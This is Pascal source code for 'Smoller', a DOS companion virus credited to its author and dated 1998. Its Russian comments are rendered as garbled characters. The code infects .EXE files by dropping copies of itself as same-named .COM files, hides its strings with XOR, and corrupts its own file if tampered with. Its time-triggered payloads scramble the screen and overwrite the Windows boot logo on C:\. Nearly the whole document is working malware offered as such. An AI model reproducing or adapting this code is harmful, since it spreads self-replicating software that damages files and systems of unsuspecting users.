   (*   HLLC.Smoller.70440
   *â®â ¢¨àãá  ¯¨á « Duke/SMF á æ¥«ìî  ¯¨á âì ®¤¨ ¨§ á ¬ëå ¡®«ìè¨å ¢
   ¬¨à¥ HLLC-¢¨àãá®¢. *®-¬®¥¬ã, ã ¥£® ¯®«ãç¨«®áì...
   ----------------------------------------------------------------------------*)
   {$M 10000, 1000, 90000}
   {$S-}
   program BigVirus;
   uses crt,dos,ADVHSC;
   const FontData : array [1..4096]  of byte={$I font.inc};
         PKUnZip  : array [1..19822] of byte={$I pkunzip.inc};
         LogoSys  : array [1..30525] of byte={$I logo.inc};
   var  Num    : byte;                    {®¬¥à á¯¥æíää¥ªâ }
        ds     : dirstr;                  {¤¨à¥ªâ®à¨ï}
        ns     : namestr;                 {¨¬ï ä ©« }
        es     : extstr;                  {à áè¨à¥¨¥}
        s      : searchrec;               {¤«ï ¯®¨áª  ¦¥àâ¢}
        st     : string;                  {¨¬ï § ¯ãáª ¥¬®£® ä ©« }
        coman  : string;                  {áâà®ª  ¯®¤ COMSPEC}
        winver : word;                    {¢¥àá¨ï Windows}
        oem    : byte;
        c,e    : string[4];               {áâà®ª¨ ¯®¤ à áè¨à¥¨ï ä ©«®¢}
        t      : string;                  {¯à®¬¥¦ãâ®ç ï áâà®ª }
   {---------------------------- ˜¨äà®¢é¨ª â¥ªáâ®¢ ----------------------------}
   function Xorer(st:string):string;
   var j:integer;
       w:string;
   begin
   w:='';
   for j:=1 to length(st) do w:=w+chr(ord(st[j]) xor (j+1) div 2);
   Xorer:=w;
   end;
   {--------------------------- “áâ ®¢ª  èà¨äâ  ------------------------------}
   procedure SetFont(p:Pointer);assembler;
   asm
    push bp
    mov ah,11h
    mov al,00h
    les bp,p
    mov cx,256
    mov dx,0
    mov bl,0
    mov bh,16
    int 10h
    pop bp
   end;
   {------------------------- ‚ë¢®¤ ¬ãá®à    íªà  ---------------------------}
   procedure DestroyScreen;
   var k:boolean;
   begin
   Randomize;
   k:=true;
   while not keypressed do
     begin
     mem[$B800:0000+random(4000)]:=random(255);
     delay(50);
     end;
   end;
   {---------------------------- * ¡®â  á ¬ã§ëª®© -----------------------------}
   Procedure MusicPlayer;
   const MasLen=5422;                           {¤«¨  § ¯ ª®¢ ®© ¬ã§ëª¨}
         d:array[1..MasLen] of byte = {$I music.inc}; {Crystal Sound}
   var k:integer;                               {ãª § â¥«ì   í«¥¬¥â ¬ áá¨¢  D}
       j:integer;                               {ãª § â¥«ì   í«¥¬¥â ¬ áá¨¢  M}
       i:integer;                               {¯à®áâ® áç¥âç¨ª}
       m:array[1..11952] of byte;               {¬ áá¨¢ ¤«ï à á¯ ª®¢ ®© ¬ã§ëª¨}
   procedure X;begin m[j]:=0;j:=j+1;end;
   begin
   for i:=1 to $90 do m[i]:=d[i];
   k:=$91;j:=$91;
   while k<=MasLen do
     begin
     case ord(d[k]) of
       $81..$9F : for i:=1 to ord(d[k])-$7F do X;
       $A0      : begin X;m[j]:=$0D;j:=j+1 end;
       $A1      : begin X;m[j]:=$12;j:=j+1 end;
       $A2      : begin X;m[j]:=$19;j:=j+1 end;
       $A3      : begin X;m[j]:=$1B;j:=j+1 end;
       $A4      : begin X;m[j]:=$22;j:=j+1 end;
       $A5      : begin X;m[j]:=$49;j:=j+1 end;
       else begin m[j]:=d[k];j:=j+1;end;
       end;
     k:=k+1;
     end;
   t:='Hg"{lv$ldsc&f''[g|gn*Hj~h!-~bjncu1eg`}3{z5ffsv|}j9vh:kssrx=$7';
     {'If you have a Sound Card, please turn on speaker or phone :)'}
   writeln(Xorer(t));
   PLAYSONGMEMORY(@M);          {*à®¨£àë¢ ¥¬ ¬ã§ëªã}
   Repeat
     POLLMUSIC;                 {‡ ¯à è¨¢ ¥¬ ã ¯«¥¥à  ¯®àæ¨î ¬ã§ëª¨}
                                {„®«¦® ¡ëâì 18 §¢ãª®¢ ¢ á¥ªã¤ã}
     Delay(10);
   Until KeyPressed;
   STOPSONG;                    {Žáâ  ¢«¨¢ ¥¬ ¯«¥¥à}
   CLEARMEM;                    {Žá¢®¡®¦¤ ¥¬ ¯ ¬ïâì}
   end;
   {------------------------- *¥à¥¢®à ç¨¢ ¨¥ íªà   -------------------------}
   procedure Invert;
   const InvertFile : array[1..1001] of byte = {$I invert.inc};
   var a:file;
   begin
   assign(a,Xorer('hotgqw*gjh'));rewrite(a,1);
                 {'invert.com'}
   blockwrite(a,InvertFile,1001);
   close(a);
   exec(coman,Xorer('.b"kmuavq+eij9f}e'));
                   {'/c invert.com>nul'}
   erase(a);
   end;
   {------------------- “áâ ®¢ª  ®¢®£® logo   § £àã§ªã ---------------------}
   procedure Logos;
   var a,b:file;
   begin
   assign(a,Xorer('qjwlyjt*`}c'));{'pkunzip.exe'}
   rewrite(a,1);
   blockwrite(a,PKUnZip,19822);
   close(a);
   assign(b,Xorer('mnem-ymt'));{'logo.zip'}
   rewrite(b,1);
   blockwrite(b,LogoSys,30525);
   close(b);
   exec(coman,Xorer('.b"rhvj~lu(c b(%f)feld"vd}.m5S0. d~'));
                   {'/c pkunzip.exe -o logo.zip c:\ >nul'}
   erase(a);
   erase(b);
   end;
   {---------------------------- ‡ à ¦¥¨¥ ä ©«®¢ -----------------------------}
   procedure zar(name:string);
   {*®à ¦¥¨¥  ©¤¥ëå ä ©«®¢ á ¯à®¢¥àª®©    «¨ç¨¥ COM-ä ©« }
   var  g : file of char;
   begin
   fsplit(name,ds,ns,es);
   st:=ds+ns+c;
   assign(g,st);{$I-}reset(g);{$I+}
   if ioresult<>0 then               {COM-ä ©«  ¥é¥ ¥â => ¥ § à ¦¥}
     exec(coman,Xorer('.b"als}')+' '+paramstr(0)+' '+st+Xorer('?own'))
                     {'/c copy'}                              {'>nul'}
   else close(g);
   end;
   {------------------- *®¨áª ¦¥àâ¢ ¨ ¢ë§®¢ § à ¦¥¨ï -------------------------}
   procedure Poisk;
   var tt : string;
   begin
   findfirst('*'+e,$21,s);
   tt:='';
   while doserror=0 do
     begin
     if tt=s.name then exit else begin tt:=s.name;zar(s.name);end;
     findnext(s);
     end;
   end;
   {-------------------- *à®¢¥àª    æ¥«®áâ®áâì ä ©«  ------------------------}
   procedure CheckChange;
   const VirSize=70440;   {„«¨  ®âª®¬¯¨«¨à®¢ ®£® ¢¨àãá  + PKLITE}
   var Virus : file;      {‡ ¯ãé¥ë© ä ©«}
       j     : integer;
       ch    : byte;
   begin
   assign(Virus,paramstr(0));
   reset(Virus,1);
   if filesize(Virus)<>VirSize then
     begin
     writeln(Xorer('†¡å§¯#¦ï%©£«è'' ¯¥¬§¢ £3'));
                  {'‡ ç¥¬ ¢ë ¬¥ï ¨§¬¥¨«¨?'}
     setfattr(Virus,$20);
     Randomize;
     for j:=1 to 1000 do
       begin
       ch:=random(255);
       seek(Virus,random(30000));
       blockwrite(Virus,ch,1);
       end;
     writeln(Xorer('ƒà§"ã£¦©«% ®¥ì¤(¤¬*¨¥¬à ¨ï«/'));
                  {'‚á¥ à ¢® ¦¨¢ë¬ ¥ ¢®§ì¬¥â¥!'}
     halt
     end;
   close(Virus);
   end;
   {------------------------- *à®¢¥àª  ¯ à ¬¥âà®¢ -----------------------------}
   procedure AboutVirus;
   begin
   if paramstr(1)='!' then
     begin
     TextColor(12);
     t:='Uikq#jw$sltst''S[dfffny!=!-J{dj?C\WO<3Df}aasx7%-6) 4##;ur=OkmlvA';
        {'This is virus [Smoller-1, Duke/SMF]. Written 25.09.98 in Russia.'}
     writeln(Xorer(t));
     TextColor(10);
     writeln(Xorer('ƒ! ªãàå¡%ç©©¬ä¯§«ª§à+í§¨©íàæ§µ0ñ±³¼ñø.'));
                  {'‚ ¢¨àãá¥ ¨á¯®«ì§®¢ ë á«¥¤ãîé¨¥ à ¡®âë:'}
     TextColor(13);
     writeln(Xorer('Gnlv#+g-%g &Crcm&ZGL'));
                  {'Font (c) by Duke/SMF'}
     writeln(Xorer('Vhlfltw$Ijai)Tq{)!i#+iu,`lioakq'));
                  {'Windows Logo.Sys (c) by maganda'}
     writeln(Xorer('Hotgqw$,f,&d~''}fbge}e+myyea|'));
                  {'Invert (c) by unknown author'}
     writeln(Xorer('IRA"Soe}`w&.d.(jp)Kihn  "LJX'));
                  {'HSC Player (c) by Access/ADV'}
     writeln(Xorer('Ltqk`#&Gw|urfk([f|dn)+$o$-lw/TXBXB2.\A@Q:MYQEVHP@'));
                  {'Music "Crystal Sound" (c) by [HRIS <ORTE/XOGRAPHY'}
     TextColor(7);
     writeln(' ');
     halt;
     end;
   end;
   {--------------------------- ‡ ¯ãáª ¦¥àâ¢ë ---------------------------------}
   procedure CheckExt;
   var f : file;
   begin
   fsplit(paramstr(0),ds,ns,es);
   if es=e then Num:=3               {¬ë ¥é¥ ¢ EXE-ä ©«¥ :(}
   else                              {¬ë ã¦¥ ¢ COM-ä ©«¥ :)}
     begin
     st:=ds+ns+e;
     assign(f,st);
     {$I-}reset(f);{$I+}             {*à®¢¥àï¥¬  «¨ç¨¥ ¦¥àâ¢ë:}
     if ioresult=0 then
       begin
       close(f);
       exec(coman,'/c '+st);         {¦¥àâ¢  ¥áâì - § ¯ãáª ¥¬ ¥¥}
       end;
     end;
   end;
   {------------------------ *à®¢¥àª   «¨ç¨ï Windows ------------------------}
   Procedure MS_MUSTDIE;Assembler;   {*à®¢¥àª   «¨ç¨ï Windows}
   var ver,rev : word;
   asm
      mov  ax, 1700h
      xor  bx, bx
      xor  cx, cx
      xor  dx, dx
      int  2Fh

      xor  bx, bx
      mov  ax, 160Ah
      int  2Fh
      mov  winver, bx

      mov  ax, 3306h
      int  21h
      mov  ver, bx
      mov  rev, dx

      mov  ah, 30h
      int  21h
      mov  oem, bh
   end;
   {-------------------------- *à®¢¥àª  â¥ªãé¥£® ¢à¥¬¥¨ ----------------------}
   procedure CheckTime;
   var th,tm,ts,td : word;           {â¥ªãé¥¥ ¢à¥¬ï}
   begin
   GetTime(th,tm,ts,td);             {*à®¢¥àª  â¥ªãé¥£® ¢à¥¬¥¨}
   if (winver<>0) and (oem=$FF)      {…á«¨ ¬ë ¢ Windows ¨ á¥©ç á ¢¥ç¥à...}
     and (th>18) then Num:=6;        {... â® ¬¥ï¥¬ logo.sys}
   if (th>=13) and (th<=15)          {…á«¨ á¥©ç á ®¡¥¤¥ë© ¯¥à¥àë¢...}
     and (Num=0) then Num:=2;        {... â® § ¬ãá®à¨¢ ¥¬ íªà }
   if (th<13) and (Num=0)            {…á«¨ á¥©ç á ãâà® ...}
     then Num:=5;                    {... â® ¯¥à¥¢®à ç¨¢ ¥¬ íªà }
   if (th>15) and (th<=18)           {…á«¨ á¥©ç á ¤¥ì ...}
     and (Num=0) then Num:=1;        {... â® ãáâ ®¢¨¬ èà¨äâ}
   end;
   {---------------------------------------------------------------------------}
   begin
   CheckChange;                      {*à®¢¥àª    æ¥«®áâ®áâì}
   AboutVirus;                       {*à®¢¥àª  ¯ à ¬¥âà  ª®¬. áâà®ª¨}
   coman:=GetEnv(Xorer('BNOQSFG'));  {“áâ ®¢ª  áâà®ª®¢ëå ª®áâ â :}
                      {'COMSPEC'}    {}
   e:=Xorer('/dzg');{'.exe'}         {}
   c:=Xorer('/bmo');{'.com'}         {}
   Poisk;                            {‡ à ¦¥¨¥}
   Num:=0;                           {‘¯¥æíää¥ªâ®¢ ¯®ª  ¥â}
   CheckExt;                         {‡ ¯ãáª ¦¥àâ¢ë}
   MS_MUSTDIE;                       {*à®¢¥àª  OS}
   CheckTime;                        {*à®¢¥àª  â¥ªãé¥£® ¢à¥¬¥¨}
   case Num of                       {Žáãé¥áâ¢«¥¨¥ á¯¥æíää¥ªâ :}
     1 : SetFont(@FontData);         {... ¤¥¬}
     2 : DestroyScreen;              {... ¢ ®¡¥¤¥ë© ¯¥à¥àë¢}
     3 : MusicPlayer;                {... ¯à¨ § ¯ãáª¥ ¨§ EXE-ä ©« }
     5 : Invert;                     {... ãâà®¬}
     6 : Logos;                      {... ¢¥ç¥à®¬ ¯®¤ Windows}
     end;
   end.                              {*« £®¯®«ãç®¥ § ¢¥àè¥¨¥ à ¡®âë}
